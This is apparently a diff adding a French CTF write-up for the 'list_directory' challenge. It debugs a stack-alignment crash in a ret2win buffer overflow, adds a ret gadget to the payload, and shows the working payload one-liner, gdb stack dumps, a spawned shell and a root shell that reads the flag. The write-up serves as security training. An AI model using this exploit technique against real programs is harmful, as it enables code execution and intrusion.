@@ -367,7 +367,123 @@ Program received signal SIGSEGV, Segmentation fault.
 148	../sysdeps/posix/system.c: No such file or directory.
 ```
 
-On est bien au message de succès, testons le payload sur l'executable :
+On est bien au message de succès, mais on tombe ensuite sur un SIGSEV. Allons voir où le programme plante exactement 
 
 ```console
+(gdb) 
+
+Program received signal SIGSEGV, Segmentation fault.
+0x00007ffff7e15603 in do_system (line=0x402010 "/bin/sh") at ../sysdeps/posix/system.c:148
+148	../sysdeps/posix/system.c: No such file or directory.
+(gdb) x/wi 0x00007ffff7e15603
+=> 0x7ffff7e15603 <do_system+339>:	movaps %xmm0,0x50(%rsp)
+```
+
+Le programme s'arrête sur une instruction movaps, on comprend d'après [ce blog](./https://ropemporium.com/guide.html#Common-pitfalls) que la stack n'est pas aligné correctement en conséquence de nos injections. D'après ce même blog il faudrait rajouter une instruction ret pour la réaligner. Essayons de call à nouveau l'instruction ret dans notre payload, avant d'appeler la fonction win :
+
+```console
+(gdb) disas vuln
+Dump of assembler code for function vuln:
+   0x00000000004011b6 <+0>:	push   %rbp
+   0x00000000004011b7 <+1>:	mov    %rsp,%rbp
+   0x00000000004011ba <+4>:	sub    $0x30,%rsp
+   0x00000000004011be <+8>:	mov    %rdi,-0x28(%rbp)
+   0x00000000004011c2 <+12>:	movabs $0x20736c2f6e69622f,%rax
+   0x00000000004011cc <+22>:	mov    $0x0,%edx
+   0x00000000004011d1 <+27>:	mov    %rax,-0x20(%rbp)
+   0x00000000004011d5 <+31>:	mov    %rdx,-0x18(%rbp)
+   0x00000000004011d9 <+35>:	movq   $0x0,-0x12(%rbp)
+   0x00000000004011e1 <+43>:	movq   $0x0,-0xa(%rbp)
+   0x00000000004011e9 <+51>:	mov    0x2e51(%rip),%eax        # 0x404040 <PATH_LEN>
+   0x00000000004011ef <+57>:	movslq %eax,%rdx
+   0x00000000004011f2 <+60>:	mov    -0x28(%rbp),%rax
+   0x00000000004011f6 <+64>:	lea    -0x20(%rbp),%rcx
+   0x00000000004011fa <+68>:	add    $0x8,%rcx
+   0x00000000004011fe <+72>:	mov    %rax,%rsi
+   0x0000000000401201 <+75>:	mov    %rcx,%rdi
+   0x0000000000401204 <+78>:	call   0x401080 <memcpy@plt>
+   0x0000000000401209 <+83>:	lea    0xe08(%rip),%rax        # 0x402018
+   0x0000000000401210 <+90>:	mov    %rax,%rdi
+   0x0000000000401213 <+93>:	call   0x401030 <puts@plt>
+   0x0000000000401218 <+98>:	nop
+   0x0000000000401219 <+99>:	leave
+   0x000000000040121a <+100>:	ret
+End of assembler dump.
+(gdb)  r <<< $(python3 -c 'import sys; sys.stdout.buffer.write(b"\x41"*32+b"\x1a\x12\x40\x00"+b"\x00"*4+b"\x76\x11\x40\x00"+b"\x00"*4)')
+Starting program: /home/coucou/Documents/CTF_SSI_2024/03_List_Directory/list_directory <<< $(python3 -c 'import sys; sys.stdout.buffer.write(b"\x41"*32+b"\x1a\x12\x40\x00"+b"\x00"*4+b"\x76\x11\x40\x00"+b"\x00"*4)')
+[Thread debugging using libthread_db enabled]
+Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
+Enter the path you want to list: 
+Not implemented yet! 
+
+Breakpoint 1, 0x000000000040121a in vuln ()
+(gdb) x/20wx $rsp
+0x7fffffffd938:	0x0040121a	0x00000000	0x00401176	0x00000000
+0x7fffffffd948:	0x4141410a	0x41414141	0x41414141	0x41414141
+0x7fffffffd958:	0x41414141	0x41414141	0x0040121a	0x00000000
+0x7fffffffd968:	0x00401176	0x00000000	0x0000000a	0x00000000
+0x7fffffffd978:	0xffffd9b0	0x00007fff	0xffffd9a0	0x00007fff
+(gdb) c
+Continuing.
+
+Breakpoint 1, 0x000000000040121a in vuln ()
+(gdb) x/20wx $rsp
+0x7fffffffd940:	0x00401176	0x00000000	0x4141410a	0x41414141
+0x7fffffffd950:	0x41414141	0x41414141	0x41414141	0x41414141
+0x7fffffffd960:	0x0040121a	0x00000000	0x00401176	0x00000000
+0x7fffffffd970:	0x0000000a	0x00000000	0xffffd9b0	0x00007fff
+0x7fffffffd980:	0xffffd9a0	0x00007fff	0x00000000	0x00000000
+(gdb) c
+Continuing.
+
+Breakpoint 2, 0x0000000000401176 in win ()
+(gdb) c
+Continuing.
+Bravo !
+[Detaching after vfork from child process 9156]
+
+Program received signal SIGSEGV, Segmentation fault.
+0x000000000040119a in win ()
+(gdb) disas
+Dump of assembler code for function win:
+   0x0000000000401176 <+0>:	push   %rbp
+   0x0000000000401177 <+1>:	mov    %rsp,%rbp
+   0x000000000040117a <+4>:	lea    0xe87(%rip),%rax        # 0x402008
+   0x0000000000401181 <+11>:	mov    %rax,%rdi
+   0x0000000000401184 <+14>:	call   0x401030 <puts@plt>
+   0x0000000000401189 <+19>:	lea    0xe80(%rip),%rax        # 0x402010
+   0x0000000000401190 <+26>:	mov    %rax,%rdi
+   0x0000000000401193 <+29>:	call   0x401060 <system@plt>
+   0x0000000000401198 <+34>:	nop
+   0x0000000000401199 <+35>:	pop    %rbp
+=> 0x000000000040119a <+36>:	ret
+End of assembler dump.
+```
+
+Le shell c'est bien lancé, puis refermé. Essayons sur l'executable :
+
+```console
+$ (python3 -c 'import sys; sys.stdout.buffer.write(b"\x41"*32+b"\x1a\x12\x40\x00"+b"\x00"*4+b"\x76\x11\x40\x00"+b"\x00"*4)' ; tee) | ./list_directory 
+Enter the path you want to list: 
+Not implemented yet! 
+Bravo !
+whoami
+coucou
+ls
+exploit.py  list_directory  README.md
+```
+
+# Script
+
+De la même manière que le chall précedent, on utilise [ce script python](./exploit.py) pour se connecter, envoyer le payload, et interagir avec le shell.
+
+```console
+$ python3 ./exploit.py
+b'Enter the path you want to list: \nNot implemented yet! \nBravo !\n'
+whoami
+b'root\n'
+ls
+b'core\nflag.txt\nlist_directory\nlist_directory.c\n'
+cat flag.txt
+b'FLAG{TR1CKY_0V3RFL0W}\n'
 ```
